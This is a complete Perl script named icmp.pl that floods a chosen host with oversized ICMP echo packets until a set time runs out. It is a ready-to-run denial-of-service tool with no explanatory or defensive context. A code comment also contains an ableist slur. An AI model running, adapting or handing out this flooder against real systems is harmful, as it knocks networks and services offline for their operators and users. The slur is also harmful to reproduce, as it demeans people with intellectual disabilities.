use Socket;
use strict;
use warnings;

if (@ARGV != 3) {
    die "Usage: icmp.pl <host> <port> <time>\n";
}

my ($ip, $port, $time) = @ARGV;
my $iaddr = inet_aton($ip) or die "Unable to resolve $ip\n";
my $endtime = time() + $time;
socket(my $flood, PF_INET, SOCK_RAW, getprotobyname('icmp'));
sub checksum {
    my $msg = shift;
    my $length = length($msg);
    my $num_short = $length / 2;
    my $chk = 0;
    foreach my $short (unpack("S$num_short", $msg)) {
        $chk += $short;
    }
    $chk = ($chk >> 16) + ($chk & 0xffff);
    return(~(($chk >> 16) + $chk) & 0xffff);
}
sub random_payload {
    my $length = shift;
    my @chars = (0..255);
    return pack('C*', map { $chars[int(rand(@chars))] } 1..$length);
}
my $payload_size = 4096;
while (time() <= $endtime) {
    my $icmp_type = 8; #so simple even a retard can understand
    my $icmp_code = 0;
    my $icmp_id = $$ & 0xffff;
    my $icmp_seq = int(rand(65535));
    my $data = random_payload($payload_size);
    my $icmp_msg = pack('C2 S3 A*', $icmp_type, $icmp_code, 0, $icmp_id, $icmp_seq, $data);
    my $icmp_checksum = checksum($icmp_msg);
    $icmp_msg = pack('C2 S3 A*', $icmp_type, $icmp_code, $icmp_checksum, $icmp_id, $icmp_seq, $data);
    send($flood, $icmp_msg, 0, pack_sockaddr_in($port, $iaddr));
}

close($flood);
